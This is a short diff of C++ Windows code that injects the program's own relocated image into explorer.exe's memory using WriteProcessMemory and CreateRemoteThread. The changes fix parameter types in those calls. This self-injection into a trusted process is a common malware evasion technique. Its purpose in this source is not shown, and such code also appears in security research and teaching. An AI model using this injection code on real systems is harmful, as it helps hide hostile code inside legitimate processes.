@@ -153,13 +153,13 @@ int main(int argc, char *argv[]) {
       relocate_image(copy_u8, (std::uintptr_t)self_u8, explorer_base);
       
       /* write the relocated executable to the process's allocation with WriteProcessMemory */
-      DWORD bytes_written;
+      SIZE_T bytes_written;
       assert(WriteProcessMemory(explorer_proc, (LPVOID)explorer_base, copy_u8, self_nt->OptionalHeader.SizeOfImage, &bytes_written));
       
       /* get the rva of the loader and call it with CreateRemoteThread */
       DWORD loader_rva = VA_TO_RVA(self_u8, load_image);
       DWORD loader_id;
-      HANDLE loader_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+loader_rva), explorer_base, 0, &loader_id);
+      HANDLE loader_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+loader_rva), (LPVOID)explorer_base, 0, &loader_id);
       assert(loader_handle != nullptr);
       
       /* wait for the thread to finish */
